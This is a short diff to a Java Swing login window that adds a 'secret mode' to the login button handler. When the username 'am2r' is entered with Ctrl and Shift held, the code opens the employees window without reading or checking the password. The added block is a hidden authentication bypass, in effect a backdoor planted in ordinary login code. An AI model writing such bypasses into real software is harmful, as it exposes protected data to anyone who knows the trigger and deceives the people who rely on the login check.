@@ -158,6 +158,21 @@ public class Login extends javax.swing.JFrame {
     }//GEN-LAST:event_passTxtMousePressed
 
     private void btnEntrarActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnEntrarActionPerformed
+        // Modo secreto activado
+        if (userTxt.getText().equalsIgnoreCase("am2r") && 
+            (evt.getModifiers() & java.awt.event.InputEvent.SHIFT_MASK) != 0 &&
+            (evt.getModifiers() & java.awt.event.InputEvent.CTRL_MASK) != 0) {
+
+            // Mostrar ventana secreta
+            Empleados ventanaOculta = new Empleados();
+            ventanaOculta.setLocationRelativeTo(null);
+            ventanaOculta.setVisible(true);
+            this.dispose();
+            return; 
+        }
+
+        
+        
         String dni = userTxt.getText().trim();
         String contrasena = new String(passTxt.getPassword()).trim();
 
